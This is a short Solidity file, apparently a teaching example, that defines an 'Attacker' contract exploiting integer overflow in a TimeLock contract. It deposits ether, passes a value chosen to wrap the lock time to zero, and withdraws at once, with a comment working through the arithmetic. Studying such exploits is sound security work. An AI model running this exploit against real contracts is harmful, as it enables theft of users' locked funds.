// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./TimeLock.sol";

contract Attacker {
    TimeLock public timeLock;

    constructor (address _timeLockAddress)  {
        timeLock = TimeLock(_timeLockAddress);
    }

    fallback() external payable {}

    function attack() external payable {
        timeLock.deposit{value: msg.value}();

         /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}